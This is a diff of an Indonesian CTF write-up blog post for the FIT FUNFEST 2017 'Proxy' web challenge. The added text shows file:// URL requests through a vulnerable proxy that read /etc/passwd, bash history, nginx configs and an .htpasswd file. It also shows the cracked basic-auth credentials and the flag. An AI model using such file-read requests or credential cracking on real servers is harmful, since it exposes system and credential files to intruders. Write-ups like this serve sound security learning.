@@ -1,15 +1,15 @@
 ---
 layout: post
 title: 'Writeup FIT FUNFEST 2017 : Proxy'
-description: Writeup EncryptedELF FIT FUNFEST CTF
+description: Writeup Proxy FIT FUNFEST CTF
 modified: 'Thu Mar 16 2017 07:00:00 GMT+0700 (WIB)'
-category: Crypto
+category: Web Exploitation
 tags: FIT CTF
 imagefeature: /images/fit-funfest.png
 mathjax: false
 chart: null
 comments: true
-featured: false
+featured: true
 published: true
 private: 'false'
 ---
@@ -136,9 +136,51 @@ background-color:#34CACA;
 
 Kurang lebih source code tersebut seperti di atas 
 
+Kemudian kami mencoba mencari cara untuk mendapatkan Remote Code Injection
+karena kami belum menemukan lokasi flag berada.
+Kami juga mencoba membaca beberapa file berikut dengan wrappers file://
+
+
+> http://128.199.66.146:12121/proxy/index.php?url=file:///etc/passwd
+http://128.199.66.146:12121/proxy/index.php?url=file:///home/web-x/.bash_history
+http://128.199.66.146:12121/proxy/index.php?url=file:///etc/hosts
+http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/sites-availa
+ble/default
+http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/sites-available/w
+eb-x
+http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/sites-available/w
+eb-y
+
+Pada file /etc/nginx/sites-available/default kami melihat ada directory rahasia yang di
+proteksi dengan ​ HTTP Basic Authentication
+
+```
+location /secret_page_uksw/ {
+try_files $uri $uri/ =404;
+autoindex on;
+auth_basic "Restricted Content";
+auth_basic_user_file /etc/nginx/.htpasswd;
+}
+```
+
+Kita baca file .htpasswd nya dengan url berikut
+
 `http://128.199.66.146:12121/proxy/index.php?url=file:///etc/nginx/.htpasswd`
 
 isinya seperti ini 
 
 `fit-uksw:{SHA}NABfMvw51MY+i1z+THOgpy9oysc=`
 
+![dectypt-sha1-htpasswd.png](/images/dectypt-sha1-htpasswd.png)
+
+
+Kemudian kami crack password yang ada pada .htpasswd tersebut sehingga di
+temukan plain text dari password adalah “indonesia45”
+Selanjutnya kita cari di mana folder /secret_page_uksw/ berada pertama coba di
+http://128.199.66.146:12121/secret_page_uksw/ namun masih not found, kami
+coba baca lagi konfigurasi nginx nya ternyata port nya ngak di custom, dia
+menggunakan port default yang terletak pada http://128.199.66.146/secret_page_uksw/ Kemudian kami masukan username danpassword untuk basic authentication **fit-uksw:indonesia45**
+
+![secret-page-proxy-flag.png]({{site.baseurl}}/images/secret-page-proxy-flag.png)
+
+**FIT2017{not_only_know_web_bug_but_also_server_config}**
